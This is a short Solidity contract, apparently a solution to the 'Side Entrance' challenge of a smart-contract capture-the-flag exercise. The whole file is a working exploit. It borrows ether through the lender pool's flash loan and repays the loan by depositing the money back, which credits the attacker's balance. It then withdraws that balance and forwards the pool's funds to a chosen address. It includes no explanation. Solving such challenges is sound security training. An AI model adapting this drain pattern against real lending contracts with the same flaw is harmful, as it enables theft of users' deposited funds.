// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "../side-entrance/SideEntranceLenderPool.sol";


contract SideEntranceAttack {

    SideEntranceLenderPool public lenderPool;
    uint256 tokensPool;
    constructor( address payable victim, uint256 amount) {
        lenderPool = SideEntranceLenderPool(victim);
        tokensPool = amount;
    }
    function execute() external payable {
        lenderPool.deposit{ value: tokensPool}();
    }

    function attack() public {
        lenderPool.flashLoan(tokensPool);
    }

    function drain(address payable _address) public payable {
        lenderPool.withdraw();
        _address.call{ value: address(this).balance}("");
    }

    receive () external payable {
    }
}